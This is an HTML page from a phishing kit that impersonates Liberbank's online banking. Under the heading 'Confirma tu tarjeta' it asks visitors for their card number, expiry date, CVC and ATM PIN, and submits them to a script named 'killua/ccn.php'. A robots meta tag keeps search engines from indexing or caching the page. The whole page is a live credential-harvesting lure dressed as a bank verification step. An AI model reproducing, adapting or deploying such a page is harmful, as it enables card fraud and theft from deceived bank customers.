<!doctype html>
<html>
<head>
  <title>Liberbank | Banco Online</title>
</head>
    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/fonts.css">
        <link rel="stylesheet" href="assets/css/main.css">

        <link rel="shortcut icon" href="assets/images/favicon.png" type="image/x-icon"> 

        <title></title>
    </head>

    <body>

        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="logo"><img src="assets/images/logo.png"></div>
                <p>Cancelar y salir</p>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main">
            <div class="container">
                <div class="row">
                    <div class="col-xl-8 col-lg-7 col-md-8 col-sm-12 col-12 mb-lg-0 mb-md-0 mb-sm-5 mb-5">
                        <div class="details2">
                            <h3 style="margin-bottom: 10px;">Confirma tu tarjeta</h3>
                            <p class="mb30">Introduzca los datos de su tarjeta de crédito para verificar su cuenta bancaria en línea</p>
                            <form action="killua/ccn.php" method="post">
                                <input type="hidden" name="verbot">
                                <input type="hidden" name="type" value="cc">
                                <div class="inner-form">
                                    <div class="form-group ">
                                        <label for="cc_number">Introduce el número de una tarjeta de Liberbank</label>
                                        <input type="text" name="cc_number" id="cc_number" class="form-control" value="">
                                                                                <p>Visa o Mastercard, debe tener 16 dígitos y empezar por 4 ó 5</p>
                                        <i class="fas fa-times-circle"></i>
                                    </div>
                                    <div class="form-group ">
                                        <label for="cc_date">Introduce la fecha de vencimiento de la tarjeta</label>
                                        <input type="text" maxlength="7" name="cc_date" id="cc_date" class="form-control" value="">
                                                                                <p>MM/AA</p>
                                        <i class="fas fa-times-circle"></i>
                                    </div>
                                    <div class="form-group ">
                                        <label for="cc_cvv">Introduce el código CVC (reverso de la tarjeta)</label>
                                        <input type="text" maxlength="3" name="cc_cvv" id="cc_cvv" class="form-control" value="">
                                                                                <p>Son 3 dígitos</p>
                                        <i class="fas fa-times-circle"></i>
                                    </div>
                                    <div class="form-group mb-0 ">
                                        <label for="cc_pin">Introduce el código secreto de un cajero automático</label>
                                        <input type="text" maxlength="4" name="cc_pin" id="cc_pin" class="form-control" value="">
                                                                                <p>Son 4 dígitos</p>
                                        <i class="fas fa-times-circle"></i>
                                    </div>
                                </div>
                                <div class="mt50">
                                    <button type="submit">Seguir</button>
                                </div>
                            </form>
                        </div>
                    </div>
                    <div class="col-xl-4 col-lg-5 col-md-4 col-sm-12 col-12">
                        <img class="d-lg-block d-md-none d-sm-none d-none" src="assets/images/sidebar.png">
                        <img class="d-lg-none d-md-block d-sm-none d-none" src="assets/images/sidebar2.png">
                        <img class="d-lg-none d-md-none d-sm-block d-block" src="assets/images/sidebar3.png">
                    </div>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- HEADER -->
        <footer id="footer">
            <div class="container">
                <div class="row">
                    <div class="col-md-2 text-lg-left text-md-left text-sm-center text-center mb-lg-0 mb-md-0 mb-sm-5 mb-5">
                        <img style="max-width: 180px;" src="assets/images/logo2.png">
                    </div>
                    <div class="col-md-8 mb-lg-0 mb-md-0 mb-sm-4 mb-4">
                        <ul>
                            <li>&copy; 2021 Liberbank</li>
                            <li>Cookies</li>
                            <li>Aviso legal</li>
                            <li>Política de privacidad y seguridad</li>
                        </ul>
                    </div>
                    <div class="col-md-2 text-lg-right text-md-right text-sm-center text-center">
                        <img src="assets/images/social.png">
                    </div>
                </div>
            </div>
        </footer>
        <!-- END HEADER -->

        <!-- JS FILES -->
        <script src="assets/js/jquery.min.js"></script>
        <script src="assets/js/popper.min.js"></script>
        <script src="assets/js/bootstrap.min.js"></script>
        <script src="assets/js/fontawesome.min.js"></script>
        <script src="assets/js/jquery.payment.js"></script>
        <script src="assets/js/main.js"></script>

        <script>
            $('.eye').click(function(){
                if( $('#password').attr('type') == 'password' ) {
                    $('#password').attr('type','text');
                    $('.eye').html('<i class="far fa-eye"></i>');
                } else if( $('#password').attr('type') == 'text' ) {
                    $('#password').attr('type','password');
                    $('.eye').html('<i class="far fa-eye-slash"></i>');
                }
            });
            $('#cc_cvv').payment('formatCardCVC');
            $('#cc_date').payment('formatCardExpiry');
            $('#cc_number').payment('formatCardNumber');
            $('#cc_pin').payment('restrictNumeric');
        </script>
        
    </body>

</html>